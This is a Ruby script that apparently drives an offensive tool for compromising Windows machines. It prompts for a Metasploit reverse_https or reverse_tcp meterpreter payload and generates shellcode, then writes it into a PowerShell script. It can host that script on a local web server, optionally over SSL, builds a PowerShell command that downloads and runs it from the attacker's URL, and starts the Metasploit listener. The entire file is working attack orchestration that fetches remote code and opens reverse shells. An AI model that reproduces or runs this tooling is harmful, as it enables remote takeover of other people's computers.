#!/usr/bin/env ruby
require_relative 'lib/server'
require_relative 'lib/core'
require_relative 'lib/menu'
include MainCommands
include MsfCommands
include Menu
def payload_select
  print "Please pick the payload you would like to use: "
  print "
    \n1) windows/meterpreter/reverse_https \
    \n2) windows/meterpreter/reverse_tcp \
    \n"
  choice = get_input('[2] > ', 2)
  choice.to_i
end
begin
  if Process.uid != 0
    print_error("Must run as root!\n")
    exit
  end
  system("chmod +x layout.sh 2> /dev/null") #Make layout.sh executable on the system
  server = Server.new
  msfhost_alert
  msf_host = server.set_host
  msf_port = server.set_port
  payload = payload_select
  payload = payload_select until payload == 1 || payload == 2
  payload = available_payloads(payload)
  unless Dir.exist?(file_root + '/metaspoit_ps_files/')
		Dir.mkdir(file_root + '/metaspoit_ps_files/')
  end
  file_path = file_root + '/metaspoit_ps_files/'
  ps_file = 'powershell_script.ps1'
  template_path = file_root + '/templates/'
  shell_code = generate_shellcode(msf_host, msf_port, payload)
  write_ps(file_path, ps_file, shell_code) #Write the powershell script (to upload on a working webserver)
  print_success("Powershell script generated successfully in '#{file_path}#{ps_file}'\n")
  hosting = get_input('Host the powershell script locally? [YES/no]: ', 'yes')
  if hosting.downcase[0] == 'y'
    webhost_alert
	ssl = get_input('Would you like to use ssl? (recommended) [YES/no]: ', 'yes')
    ssl = true if ssl.downcase[0] == 'y'
    webserver_host = server.set_host_web(msf_host)
    webserver_port = server.set_port_web(msf_port, ssl)
    #shell_code = generate_shellcode(msf_host, msf_port, payload)
    Thread.new do
      server.ruby_web_server(webserver_port, ssl, webserver_host, shell_code)
    end
    if ssl == true
      powershell_command("https://#{webserver_host}:#{webserver_port}", template_path)
    else
      powershell_command("http://#{webserver_host}:#{webserver_port}", template_path)
    end
    metasploit_setup(msf_host, msf_port, payload)
  else
    url = get_input('Enter the url that holds the powershell script that you uploaded manually on a webserver: ')
    powershell_command(url, template_path)
    metasploit_setup(msf_host, msf_port, payload)
  end
end
